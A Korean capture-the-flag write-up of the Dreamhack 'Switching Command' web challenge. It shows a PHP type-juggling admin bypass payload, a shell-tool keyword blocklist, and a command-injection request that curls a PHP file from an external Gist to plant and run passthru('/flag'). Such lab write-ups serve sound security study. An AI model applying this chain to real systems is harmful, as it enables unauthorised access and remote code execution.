# S4 · Switching Command

**해결 완료** · Web · PHP Type Juggling · Command Execution

- 문제: [Dreamhack — Switching Command](https://dreamhack.io/wargame/challenges/1081)
- 핵심 흐름: **PHP Type Juggling → 관리자 세션 → 명령 실행 → run.php 배치 → /flag 실행 → FLAG 확인**
- 본 문서는 제공된 문제 ZIP의 소스 분석과 Burp Suite에서 진행한 요청 흐름, Gist 파일 및 실습 서버 응답을 정리한 것이다.
- 실습용 도메인과 포트는 해당 VM 인스턴스의 값으로, 다시 실행하면 달라질 수 있다.

## 1. 전체 흐름

```text
index.php
  └─ JSON 사용자 입력과 PHP 비교 방식 차이로 admin 분기 진입
       ↓
config.php
  └─ session_start() 및 PHP 세션 유지
       ↓
test.php
  └─ 관리자 세션 확인 후 GET cmd 파라미터로 명령 실행
       ↓
GitHub Gist의 run.php
  └─ curl로 PHP 파일을 웹 서버에 다운로드
       ↓
/run.php 접속
  └─ passthru('/flag')가 실행 파일의 출력을 반환
       ↓
FLAG 획득 및 Dreamhack 정답 확인
```

## 2. index.php — 관리자 인증 우회

### 취약한 코드

```php
$data = json_decode($_POST["username"]);

if ($data === null) {
    exit("Failed to parse JSON data");
}

$username = $data->username;

if ($username === "admin") {
    exit("no hack");
}

switch ($username) {
    case "admin":
        $user = "admin";
        $password = "***REDACTED***";

        $stmt = $conn->prepare(
            "SELECT * FROM users WHERE username = ? AND password = ?"
        );
        $stmt->bind_param("ss", $user, $password);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows == 1) {
            $_SESSION["auth"] = "admin";
            header("Location: test.php");
        }
        break;

    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
```

입력한 JSON은 `json_decode()`를 거친 뒤 `$data->username`에 저장된다. 이때 PHP의 엄격 비교와 느슨한 비교를 혼용한다.

```php
var_dump(true === "admin"); // false
var_dump(true == "admin");  // true
```

- `===`는 자료형까지 비교하므로 Boolean `true`와 문자열 `"admin"`이 일치하지 않는다.
- 이 문제의 `switch` 비교에서는 Boolean `true`가 문자열 `"admin"`과 느슨하게 일치하여 관리자 분기에 진입할 수 있다.
- 관리자로 분기되면 입력한 Boolean 값을 DB에서 조회하는 것이 아니라, 코드에 정의된 `$user` / `$password`를 조회한다.
- 제공된 `deploy/mysql_init/init.sql`에는 해당 관리자 계정이 등록되어 있으며, 조회 결과가 1건이면 `$_SESSION["auth"] = "admin"`이 실행된다.

따라서 사용한 JSON 입력은 다음과 같다.

```json
{"username":true}
```

### 실제 Burp Repeater 요청

```http
POST /index.php HTTP/1.1
Host: host3.dreamhack.games:21271
Content-Type: application/x-www-form-urlencoded
Connection: close

username=%7B%22username%22%3Atrue%7D
```

URL 인코딩: `%7B` = `{`, `%22` = `"`, `%3A` = `:`, `%7D` = `}`.

당시 응답에서 확인한 형식:

```http
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: test.php
```

`PHPSESSID`를 이후 요청에 포함하면 같은 세션을 유지할 수 있다. **단, 302 응답만으로 관리자 인증 성공이 확정되는 것은 아니다.** guest 분기도 `test.php`로 리다이렉트하기 때문이다. 이후 관리자 전용 동작으로 구분한다.

## 3. test.php — 명령 실행 및 출력 변수 불일치

제공된 `deploy/src/test.php`의 핵심:

```php
include("./config.php");

$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if ($_SESSION["auth"] === "admin") {

    $command = isset($_GET["cmd"])
        ? $_GET["cmd"]
        : "ls";

    $sanitized_command = str_replace("\n", "", $command);

    if (preg_match($pattern, $sanitized_command)) {
        exit("No hack");
    }

    $resulttt = shell_exec(
        escapeshellcmd($sanitized_command)
    );
}
else if ($_SESSION["auth"] === "guest") {

    $command = "echo hi guest";
    $result = shell_exec($command);

}
else {
    $result = "Authentication first";
}
```

- `$_SESSION["auth"] === "admin"`: 관리자 세션 검사
- `$_GET["cmd"]`: URL의 `cmd` 값 사용
- `str_replace("\n", "", ...)`: 줄바꿈 제거
- `preg_match()`: `flag`, `bash`, `sh` 등의 특정 단어 차단
- `escapeshellcmd()`: 셸 메타문자를 일부 이스케이프
- `shell_exec()`: 서버에서 명령 실행

이 코드에는 별도의 출력 오류도 존재한다.

```php
$resulttt = shell_exec(escapeshellcmd($sanitized_command));
// 실제 HTML 출력부:
echo "<pre>$result</pre>";
```

관리자 분기의 실행 결과 변수는 `$resulttt`인데, 화면에서 출력하는 변수는 `$result`이므로 **명령이 실행돼도 출력이 나타나지 않을 수 있다.** Burp에서 명령 실행 결과를 바로 볼 수 없었던 원인을 이 차이로 분석했다.

## 4. run.php 준비 — 결과를 직접 출력하는 PHP 코드

`test.php`에 `/flag`를 직접 넣으면 정규식의 `flag` 차단 조건에 걸리므로, 별도 PHP 파일을 준비했다.

GitHub Gist에 생성한 파일 이름: **`run.php`**

```php
<?php
passthru('/flag');
?>
```

`passthru()`는 외부 프로그램을 실행하고 그 출력을 바로 전달한다.

### 왜 /flag를 실행하는가?

제공된 `Dockerfile`의 관련 부분:

```dockerfile
COPY ./flag.c /flag.c

RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c
```

`flag.c`를 컴파일하여 `/flag` 실행 파일을 만들고 실행 권한을 부여한 뒤 소스 파일을 삭제한다. 그러므로 `/flag`는 텍스트 파일을 읽는 대상이 아니라 **실행할 프로그램**이다. ZIP에 포함된 `flag.c`의 출력은 테스트용이었고, 실제 서버의 플래그 값은 달랐다.

## 5. Gist의 run.php를 서버에 내려받는 흐름

사용한 Gist Raw 주소:

```text
https://gist.githubusercontent.com/myhtml1231-star/1782817ec026490b75c425a742f53c8a/raw/d465571a999d0c87a875fc83cbb8f550da074923/run.php
```

관리자 세션에서 `test.php`의 `cmd` 파라미터를 이용해 파일을 내려받는 명령 형태:

```sh
curl -fsSL "GIST_RAW_URL" -o run.php
```

| 옵션 | 의미 |
|---|---|
| `-f` | HTTP 오류 응답이면 실패 처리 |
| `-s` | 진행 메시지 숨김 |
| `-S` | 오류 발생 시 오류 메시지 표시 |
| `-L` | 리다이렉트 따라가기 |
| `-o run.php` | 받은 파일을 `run.php`로 저장 |

Burp 요청의 구조:

```http
GET /test.php?cmd=curl%20-fsSL%20GIST_RAW_URL%20-o%20run.php HTTP/1.1
Host: host3.dreamhack.games:21271
Cookie: PHPSESSID=관리자인증된_세션ID
Connection: close

```

실제 요청 시 `GIST_RAW_URL` 자리에는 위 Raw 파일 주소를 넣고 필요에 따라 URL 인코딩한다. **위 HTTP 블록은 요청의 구조를 설명하기 위한 템플릿**이다.

여기서 핵심은 요청 `cmd` 문자열에 `/flag`를 직접 넣지 않았다는 점이다. `/flag` 실행 코드는 다운로드된 `run.php` 내부에 있으며, `test.php`의 블랙리스트는 그 파일의 PHP 내용까지 검사하지 않는다.

파일을 실제로 저장할 수 있는지는 실행 디렉터리, 웹 서버 파일 권한, 외부 통신 및 PHP 처리 설정에 따라 달라진다.

## 6. run.php 실행과 FLAG 획득

실제로 확인한 접근 경로:

```http
GET /run.php HTTP/1.1
Host: host3.dreamhack.games:21271
Connection: close

```

동작 흐름:

```text
GET /run.php
    ↓
Apache + PHP가 run.php 실행
    ↓
passthru('/flag')
    ↓
/flag 실행 파일 실행
    ↓
프로그램의 표준 출력이 HTTP 응답으로 전달
```

브라우저에서 `http://host3.dreamhack.games:21271/run.php`에 접근하여 아래 출력을 확인했다.

```text
DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}
```

Dreamhack 문제 화면에도 **“축하합니다! 문제를 해결했습니다.”**라고 표시되어 정답 처리를 확인했다.

## 7. 취약점 및 실습 요소 요약

| 취약점·문제 | 소스 파일 | 원인 또는 역할 |
|---|---|---|
| PHP Type Juggling | `index.php` | `===`와 `switch`의 느슨한 비교 방식 차이 |
| 관리자 인증 우회 | `index.php` | Boolean 값을 통해 관리자 분기에 진입하고 고정된 DB 계정으로 인증 |
| 관리자 세션 유지 | `config.php` | `session_start()`와 `PHPSESSID` 사용 |
| OS Command Execution | `test.php` | 사용자 제공 `cmd`를 `shell_exec()`에 전달 |
| 불완전한 명령 필터링 | `test.php` | 단어 블랙리스트로 특정 문자열만 차단 |
| 결과 출력 오류 | `test.php` | `$resulttt`와 `$result` 변수명 불일치 |
| 별도 PHP 파일의 실행 | `run.php` | `passthru('/flag')`로 실행 파일 출력 노출 |

### 결론

`index.php`의 비교 방식 차이로 관리자 인증 분기를 우회하고, `test.php`의 명령 실행 지점에서 외부 PHP 파일을 저장한 뒤 `/run.php`를 실행하여 FLAG를 얻었다.

**PHP Type Juggling → Admin Session → Command Execution → PHP File Execution → FLAG**

---

> 기록 구분: **코드와 Burp 요청 형태**는 사용자가 제공한 소스·실습 기록을 기반으로 정리했다. **Gist의 run.php 내용, 실습 서버 /run.php 응답, Dreamhack의 해결 완료 상태**는 열린 페이지에서도 확인했다. 실제 요청에서 사용한 전체 인코딩된 curl 명령 문자열은 별도 원본 로그가 없어 템플릿으로 표시했다.
